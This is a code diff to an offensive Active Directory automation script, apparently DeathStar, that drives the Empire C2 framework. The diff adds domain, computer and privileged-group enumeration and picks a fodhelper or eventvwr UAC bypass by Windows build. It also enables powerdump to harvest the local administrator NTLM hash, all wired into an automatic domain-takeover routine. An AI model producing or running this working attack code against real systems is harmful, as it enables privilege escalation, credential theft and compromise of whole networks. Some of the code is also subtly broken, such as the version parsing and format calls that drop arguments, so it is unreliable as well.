@@ -186,6 +186,11 @@ def execute_module_with_results(module_name, agent_name, module_options=None):
                             if 'S-1-5-21' in entry['results']:
                                 done = True
 
+                        # This is for powerdump because Empire doesn't have a "completed" string when it is done
+                        if module_name == 'powershell/credentials/powerdump':
+                                if ':500:' in entry['results']:
+                                    done = True
+
                         # Empire returns "Job started: xxxxxx" as results but we need just the completed results
                         if ' completed' in entry['results']:
                             done = True
@@ -234,7 +239,7 @@ def get_domain_sid(agent_name):
     return results
 
 
-def get_group_member(agent_name, group_sid, recurse=True):
+def get_group_member(agent_name, group_sid, group_name,recurse=True):
     module_options = {'Identity': group_sid,
                       'Recurse': str(bool(recurse))}
 
@@ -250,9 +255,9 @@ def get_group_member(agent_name, group_sid, recurse=True):
             if entry.startswith('MemberName'):
                 user = entry.split(':')[1].strip()
 
-        if user and domain: members.append('{}\\{}'.format(domain, user))
+        if user and domain: members.append('{}\{}'.format(domain, user))
 
-    print_good("Found {} members of the Domain Admins group: {}".format(len(members), members), agent_name)
+    print_good("Found {} members of the {} group: {}".format(len(members), group_name, members), agent_name)
 
     return members
 
@@ -268,6 +273,60 @@ def get_domain_controller(agent_name):
     print_good('Found {} Domain Controllers: {}'.format(len(dcs), dcs), agent_name)
 
     return dcs
+
+
+def get_domains(agent_name):
+    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_forest_domain', agent_name)
+    results = results.strip().split('\r\n')
+    domains = []
+    for entry in results:
+        if entry.startswith('Name'):
+            domains.append(entry.split(':')[1].strip())
+
+    print_good('Found {} Domains: {}'.format(len(domains), domains), agent_name)
+
+    return domains
+
+
+def get_computers(agent_name):
+    results = execute_module_with_results('powershell/situational_awareness/network/powerview/get_computer', agent_name)
+    results = results.strip().split('\r\n\r\n')[:-2]
+    computers = []
+    for result in results:
+        computer = None
+        os = None
+        for entry in result.split('\r\n'):
+            if entry.startswith('name'):
+                computer = entry.split(':')[1].strip().lower()
+            if entry.startswith('operatingsystem') and not entry.startswith('operatingsystemversion'):
+                os = entry.split(':')[1].strip()
+
+        if computer and os: computers.append('{} => {}'.format(computer, os))
+
+    print_good('Found {} Computers'.format(len(computers)), agent_name)
+    for computer in computers:
+        print('        {}'.format(computer))
+
+    return computers
+
+
+def get_os_version(agent_name):
+    results = run_shell_command_with_results(agent_name, 'cmd /c ver')
+    results = results.strip().split('\r\n')
+
+    for entry in results:
+        version = None
+        if entry.startswith('Microsoft'):
+            version = entry.split('[')[1].strip(']')
+            version = entry.split(' ')[1]
+            version = entry.split('.')[2]
+
+    print_good('Agent is running on Windows build {}'.format(version), agent_name)
+
+    # Going to be doing greater than or equal comparison on this in elevate def
+    version = int(version)
+
+    return version
 
 
 def user_hunter(agent_name, threads):
@@ -500,6 +559,71 @@ def bypassuac_eventvwr(agent_name, listener='DeathStar'):
     print_info('Attempting to elevate using bypassuac_eventvwr', agent_name)
     execute_module('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
 
+
+def bypassuac_fodhelper(agent_name, listener='DeathStar'):
+    module_options = {'Listener': listener}
+
+    print_info('Attempting to elevate using bypassuac_fodhelper', agent_name)
+    execute_module('powershell/privesc/bypassuac_fodhelper', agent_name, module_options)
+
+
+
+def add_creds(credentials):
+
+    try:
+        r = requests.post(base_url + '/api/creds', params=token, headers=headers, json=credentials, verify=False)
+        if r.status_code == 200:
+            r = r.json()
+            if debug: print_debug("Attempted credentials addition => success")
+            return r
+        else:
+            print_bad("Error adding credentials: {}".format(credentials, r.json()))
+            print_bad("JSON Status Code: {}, JSON Error: {}".format(r.status_code, r.reason))
+            print_bad("JSON Message: {}".format(r.content))
+
+    except Exception as e:
+        print_bad("Exception adding credentials: {}".format(credentials, e))
+        print_bad("JSON Status Code: {}, JSON Error: {}".format(r.status_code, r.reason))
+        print_bad("JSON Message: {}".format(r.content))
+
+
+def powerdump(agent_name):
+    results = execute_module_with_results('powershell/credentials/powerdump', agent_name)
+    #print_debug('POWERDUMP => results: {}'.format(results), agent_name)
+
+    results = results.split('\r\n')
+
+    user = None
+    ntlm_hash = None
+
+    for entry in results:
+        if ':500:' in entry:
+            # This is absolutely fucking stupid. But required. Remove: "Job started: XXXXXX" from the beginning of the resultant data
+            if entry.startswith("Job started"):
+                entry = entry[19:]
+
+            user = entry.split(':')[0].strip()
+            ntlm_hash = entry.split(':')[3].strip()
+            #print_debug("POWERDUMP => user: {}, hash: {}".format(user, ntlm_hash), agent_name)
+
+    print_good('Found local admin account {} (RID 500) with hash: {} '.format(user, ntlm_hash), agent_name)
+    #credentials = {"credentials": [["credtype", "hash"], ["domain", "workgroup"], ["username", user], ["password", ntlm_hash], ["host", "all"]]}
+
+    # FIXME: not sure why JSON requests are failing, tried multiple ways to submit the data
+    #credentials = {
+    #   'credentials': {
+    #       'credtype': "hash",
+    #       'domain': "workgroup",
+    #       'username': user,
+    #       'password': ntlm_hash,
+    #       'host': None
+    #   }
+    #}
+    #credentials = { "credentials": {"credtype":"hash", "domain":"workgroup", "username":user, "password":ntlm_hash, "host":""} }
+    #add_creds(credentials)
+
+
+
 #########################################################################################################################################
 
 
@@ -509,13 +633,34 @@ def recon(agent_name):
 
         domain_sid = get_domain_sid(agent_name)
         DA_group_sid = domain_sid + '-512'
-        for member in get_group_member(agent_name, DA_group_sid):
+        EA_group_sid = domain_sid + '-519'
+        Administrators_group_sid = 'S-1-5-32-544'
+
+        for member in get_group_member(agent_name, DA_group_sid, 'Domain Admins'):
             with lock:
                 domain_admins.append(member)
+
+        if args.additional_groups:
+            for member in get_group_member(agent_name, EA_group_sid, 'Enterprise Admins'):
+                with lock:
+                    enterprise_admins.append(member)
+            for member in get_group_member(agent_name, Administrators_group_sid, 'Administrators'):
+                with lock:
+                    administrators.append(member)
+
+        for domain in get_domains(agent_name):
+            with lock:
+                domains.append(domain)
 
         for dc in get_domain_controller(agent_name):
             with lock:
                 domain_controllers.append(dc)
+
+        if args.find_computers:
+            for computer in get_computers(agent_name):
+                with lock:
+                    computers.append(computer)
+
 
         if not domain_admins and not domain_controllers:
             print_bad('Could not find Domain Admins and Domain Controllers. This usually means something is wrong with the Agent.')
@@ -535,7 +680,13 @@ def recon(agent_name):
 
 
 def elevate(agent_name):
-    bypassuac_eventvwr(agent_name)
+    # Versions of Windows 10 >= 15007 Creators Update are not susceptible to bypassuac_eventvwr
+    if agents[agent_name]['os'].lower().find('windows 10') != -1:
+        version = get_os_version(agent_name)
+        if version >= 15007:
+            bypassuac_fodhelper(agent_name)
+    else:
+        bypassuac_eventvwr(agent_name)
 
 
 def spread(agent_name):
@@ -635,7 +786,8 @@ def pwn_the_shit_out_of_everything(agent_name):
 
     if agents[agent_name]['high_integrity']:
         # tokens(agent_name)
-        # powerdump(agent_name)
+        print_info('Attempting powerdump', agent_name)
+        powerdump(agent_name)
 
         # This doesn't need to be explorer, change it at will ;)
         for process in tasklist(agent_name, process='explorer'):
@@ -779,6 +931,8 @@ if __name__ == '__main__':
     args.add_argument('--no-mimikatz', action='store_true', help='Do not use Mimikatz during lateral movement (default: False)')
     args.add_argument('--no-domain-privesc', action='store_true', help='Do not use domain privilege escalation techniques (default: False)')
     args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
+    args.add_argument('--find-computers', action='store_true', help='Find all computers in the domain and print during recon (default: False)')
+    args.add_argument('--additional-groups', action='store_true', help='Display information about all domain privielged groups (default: False)')
     args.add_argument('--debug', action='store_true', help='Enable debug output')
 
     args = args.parse_args()
@@ -793,6 +947,7 @@ if __name__ == '__main__':
     module_threads = args.threads
     base_url = args.url
     debug = args.debug
+    find_computers = args.find_computers
 
     agents = {}
 
@@ -803,7 +958,11 @@ if __name__ == '__main__':
 
     priority_targets = []    # List of boxes with admin sessions
     domain_controllers = []
+    domains = []
+    computers = []
     domain_admins = []
+    enterprise_admins = []
+    administrators = []
     spread_usernames = []    # List of accounts we already used to laterally spread
     psinject_usernames = []  # List of accounts we psinjected into
     spawned_usernames = []   # List of accounts we spawned agents with
